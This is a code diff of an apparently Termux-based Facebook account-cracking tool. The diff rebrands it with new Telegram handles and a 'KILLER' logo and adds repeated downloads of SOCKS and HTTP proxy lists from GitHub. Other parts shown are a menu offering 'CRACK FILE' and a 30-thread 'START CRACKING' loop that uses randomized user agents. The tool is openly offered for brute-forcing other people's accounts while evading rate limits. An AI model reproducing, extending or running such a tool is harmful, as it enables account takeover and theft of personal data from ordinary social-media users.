@@ -16,10 +16,8 @@ pretty.install()
 CON=sol()
  #------------------[ ANAS ]-------------------#
 import os, platform, time, sys
-print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mANAS HACK FB 💀 ')
 time.sleep(5)
 os.system('clear')
-print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mJOIN MY TELEGRAM GROUP")
 time.sleep(2)
 #os.system(f'xdg-open https://t.me/anasTermux')
 #------------------[ ANAS ]-------------------#
@@ -49,11 +47,88 @@ cokbrut=[]
 ses=requests.Session()
 princp=[]
 try:
-    prox= requests.get('https://github.com/Sewaktimsina/Sewak/ua/blob/main/bbnew.txt').text
-    open('.prox.txt','w').write(prox)
+	prox= requests.get('https://raw.githubusercontent.com/Chigozieworldwide/KING/main/socks5.txt').text
+	open('.socks5.txt','w').write(prox) 
 except Exception as e:
-    pass
-prox=open('.prox.txt','r').read().splitlines()
+
+	prox=open('.proxy.txt','r').read().splitlines()
+
+try:
+	prox= requests.get('https://raw.githubusercontent.com/Chigozieworldwide/KING/main/socks4.txt').text
+	open('.socks4.txt','w').write(prox) 
+except Exception as e:
+
+	prox=open('.proxy.txt','r').read().splitlines()
+
+try:
+	prox= requests.get('https://github.com/Chigozieworldwide/KING/blob/main/https.txt').text
+	open('.https.txt','w').write(prox) 
+except Exception as e:
+
+	prox=open('.proxy.txt','r').read().splitlines()
+
+try:
+	prox= requests.get('https://raw.githubusercontent.com/Chigozieworldwide/KING/main/http.txt').text
+	open('.http.txt','w').write(prox) 
+except Exception as e:
+
+	prox=open('.proxy.txt','r').read().splitlines()
+
+try:
+	prox= requests.get('https://raw.githubusercontent.com/Chigozieworldwide/XFORD/main/http.txt').text
+	open('.http.txt','w').write(prox) 
+except Exception as e:
+
+	prox=open('.proxy.txt','r').read().splitlines()
+
+try:
+	prox= requests.get('https://raw.githubusercontent.com/Chigozieworldwide/XFORD/main/https.txt').text
+	open('.https.txt','w').write(prox) 
+except Exception as e:
+
+	prox=open('.proxy.txt','r').read().splitlines()
+
+try:
+	prox= requests.get('https://raw.githubusercontent.com/Chigozieworldwide/XFORD/main/socks4.txt').text
+	open('.socks4.txt','w').write(prox) 
+except Exception as e:
+
+	prox=open('.proxy.txt','r').read().splitlines()
+
+try:
+	prox= requests.get('https://raw.githubusercontent.com/Chigozieworldwide/XFORD/main/socks5.txt').text
+	open('.socks5.txt','w').write(prox) 
+except Exception as e:
+
+	prox=open('.proxy.txt','r').read().splitlines()
+
+try:
+	prox= requests.get('https://raw.githubusercontent.com/Chigozieworldwide/XCARET/main/http.txt').text
+	open('.http.txt','w').write(prox) 
+except Exception as e:
+
+	prox=open('.proxy.txt','r').read().splitlines()
+
+try:
+	prox= requests.get('https://raw.githubusercontent.com/Chigozieworldwide/XCARET/main/https.txt').text
+	open('.https.txt','w').write(prox) 
+except Exception as e:
+
+	prox=open('.proxy.txt','r').read().splitlines()
+
+try:
+	prox= requests.get('https://raw.githubusercontent.com/Chigozieworldwide/XCARET/main/socks4.txt').text
+	open('.socks4.txt','w').write(prox) 
+except Exception as e:
+
+	prox=open('.proxy.txt','r').read().splitlines()
+
+try:
+	prox= requests.get('https://raw.githubusercontent.com/Chigozieworldwide/XCARET/main/socks5.txt').text
+	open('.socks5.txt','w').write(prox) 
+except Exception as e:
+
+	prox=open('.proxy.txt','r').read().splitlines()
 for xd in range(10000):
     a='Mozilla/5.0 (Symbian/3; Series60/'
     b=random.randrange(1, 9)
@@ -199,7 +274,23 @@ def linex():
 def animation(u):
     for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
 #------------------[ LOGO-ANAS ]-----------------#
-logo ="""
+logo =""" _  _______ _      _      ______ _____      
+\33[1;32m| |/ /_   _| |    | |    |  ____|  __ \         
+\33[1;33m| ' /  | | | |    | |    | |__  | |__) |     
+\33[1;34m|  <   | | | |    | |    |  __| |  _  /      
+\33[1;35m| . \ _| |_| |____| |____| |____| | \ \     
+\33[1;36m|_|\_\_____|______|______|______|_|  \_\
+
+
+
+\33[1;92m ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■
+\33[1;36m TOOL CREATE BY➢ KILLER & RaWa
+\33[1;34m CHENEL➢@KILLER_SHOPPING
+\33[1;36m TELGRAM➢@i4m_killer & @l4m_rawa
+\33[1;34m VERSION➢1.1
+\33[1;32m KILLER is the father of Telegram
+\33[1;34m EXPIRED TOOL➢3DAYS
+\33[1;92m ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■
 ;92m╌╍╌╍╌╍"""          
 os.system('clear')
 print(logo)
@@ -254,10 +345,10 @@ class jalan:
 def menu():
     os.system('clear')
     print(logo)
-    print(f"\x1b[1;92m╍╌╍╌╍\x1b[1;95m‒╍╌╍╌╍‒\x1b[1;94m╍╌╍╌╍\x1b[1;97m╌╍╌╍╍\x1b[1;96m╌╍╌╍‒╍\x1b[1;93m╌╍╌╍‒╍\x1b[1;91m╌╍╌╍╌╍\x1b[1;92m╌╍╌╍╌╍")
-    print(f"""\033[94;1m[ \033[92;1mP\033[94;1m ] \033[0;92mCRACK FILE   \033[95;1m⦅VIP⦆     """)
-    print(f"""\033[94;1m[ \033[92;1mL\033[94;1m ] \033[92;1mCHECK OK + CP IDZ   """)
-    print(f"\x1b[1;92m╍╌╍╌╍\x1b[1;95m‒╍╌╍╌╍‒\x1b[1;94m╍╌╍╌╍\x1b[1;97m╌╍╌╍╍\x1b[1;96m╌╍╌╍‒╍\x1b[1;93m╌╍╌╍‒╍\x1b[1;91m╌╍╌╍╌╍\x1b[1;92m╌╍╌╍╌╍")
+    #print(f"\x1b[1;92m╍╌╍╌╍\x1b[1;95m‒╍╌╍╌╍‒\x1b[1;94m╍╌╍╌╍\x1b[1;97m╌╍╌╍╍\x1b[1;96m╌╍╌╍‒╍\x1b[1;93m╌╍╌╍‒╍\x1b[1;91m╌╍╌╍╌╍\x1b[1;92m╌╍╌╍╌╍")
+    print('\x1b[1;91m[ 2 ] CRACK FILE')
+    #print(f"""\033[94;1m[ \033[92;1mL\033[94;1m ] \033[92;1mCHECK OK + CP IDZ   """)
+    #print(f"\x1b[1;92m╍╌╍╌╍\x1b[1;95m‒╍╌╍╌╍‒\x1b[1;94m╍╌╍╌╍\x1b[1;97m╌╍╌╍╍\x1b[1;96m╌╍╌╍‒╍\x1b[1;93m╌╍╌╍‒╍\x1b[1;91m╌╍╌╍╌╍\x1b[1;92m╌╍╌╍╌╍")
     SEWAK = input('\x1b[1;94m[+\x1b[1;94m] \x1b[1;97mCHOOSE\x1b[1;97m:\033[92;1m ')
     if SEWAK in ['PPP']:
         login()
@@ -508,10 +599,7 @@ def setting():
  
 def passwrd():
     print("")
-    print("\033[97;1m[\033[92;1m➢\033[97;1m] ANAS \x1b[33m[➢\x1b[33m] \x1b[33m[\033[0;92mTODAY \x1b[36mDATE\x1b[33m] :\033[1;92m "+date)
-    print('\033[97;1m[\033[92;1m➢\033[97;1m] ANAS \x1b[33m[➢\x1b[33m] \x1b[33m[\033[0;92mTOTAL \x1b[36mID\x1b[33m] : ',str(len(id)))
-    print("\033[97;1m[\033[92;1m➢\033[97;1m] ANAS \x1b[33m[➢\x1b[33m] \x1b[33m[\033[0;92mTODAY \x1b[36mTIME\x1b[33m] : \033[1;92m"+time.strftime("%H:%M")+" "+ tag)
-    print("\033[97;1m[\033[92;1m➢\033[97;1m] ANAS \x1b[33m[➢\x1b[33m] \x1b[33m[\033[0;92mSTART \x1b[36mCRACKING\x1b[33m]")
+    
     print('═━═━═━═━═━━═━═━═━═━━═━═━═━═━═━═')
     with tred(max_workers=30) as pool:
         for yuzong in id2:
